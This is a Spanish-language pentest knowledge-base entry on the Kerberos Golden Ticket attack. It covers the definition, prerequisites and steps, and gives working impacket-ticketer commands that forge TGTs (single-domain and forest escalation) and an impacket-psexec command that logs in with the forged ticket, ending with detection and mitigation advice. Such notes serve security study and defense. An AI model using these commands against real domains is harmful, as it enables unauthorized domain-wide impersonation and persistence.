---
title: Golden Ticket
resumen: Falsificar un TGT completo con la clave de krbtgt para suplantar a cualquier usuario del dominio a voluntad.
tags: impacket, mimikatz, rubeus
---

## Definición

En el protocolo Kerberos, la cuenta **`krbtgt`** es la encargada exclusiva de cifrar y firmar los tickets TGT (*Ticket Granting Ticket*), que sirven como identidad inicial del usuario en toda la red. Un **Golden Ticket** consiste en la falsificación local y completa de un TGT legítimo: al poseer la clave (hash NTLM o AES) de la cuenta `krbtgt`, el atacante no necesita pedirle el ticket al DC — lo fabrica él mismo en su propia máquina. Como el KDC confía ciegamente en la criptografía de su propia clave, aceptará ese ticket como válido sin comprobar ninguna contraseña.

## Cuándo se usa

Como mecanismo de **persistencia** tras haber obtenido el hash de `krbtgt` (típicamente vía DCSync). Un Golden Ticket sigue siendo válido aunque el usuario suplantado cambie su contraseña, y solo deja de funcionar si se rota la clave de `krbtgt` (dos veces, por el histórico de claves).

## Requisitos previos

- Hash NTLM o clave AES256 de la cuenta `krbtgt` del dominio.
- SID del dominio (y del dominio padre, si se trabaja en un bosque con relación child-parent).

## Desarrollo del ataque

1. Obtener el hash de `krbtgt` (por ejemplo, vía DCSync).
2. Obtener el SID del dominio.
3. Fabricar el TGT falsificado especificando el usuario a suplantar (real o inventado) y el grupo cuyo RID se quiere incluir (512 = Domain Admins, 519 = Enterprise Admins si se trabaja a nivel de bosque).
4. Cargar el ticket resultante en la sesión (Pass the Ticket) y autenticarse con él donde se necesite.

```bash
# Escenario con un único DC (no forest)
impacket-ticketer -domain dominio.local -nthash HASH_KRBTGT -domain-sid S-1-5-21-XXXX-XXXX-XXXX -user-id 512 Administrator
```

```bash
# Escenario forest (child -> parent), con permisos de Enterprise Admins
impacket-ticketer -domain child.dominio.corp -nthash HASH_KRBTGT_CHILD \
  -domain-sid SID_CHILD -groups 519 -extra-sid SID_PARENT-519,S-1-5-9 'Administrator'
```

```bash
# Cargar el ticket generado y autenticarse con él
export KRB5CCNAME=Administrator.ccache
impacket-psexec dominio.local/Administrator@DC01.dominio.local -k -no-pass
```

## Herramientas relacionadas

- Ver [[impacket]] (ticketer)
- Ver [[mimikatz]]
- Ver [[rubeus]]

## Detección y mitigación

Rotar la contraseña de `krbtgt` periódicamente (dos veces seguidas, por el histórico de claves), limitar el tiempo de vida máximo de los TGT, y monitorizar tickets con datos inconsistentes (por ejemplo, RID de grupo que no corresponde al usuario, o tiempos de vida anómalos) — es una de las técnicas más difíciles de detectar por firma, así que la mitigación real pasa por dificultar el DCSync previo.
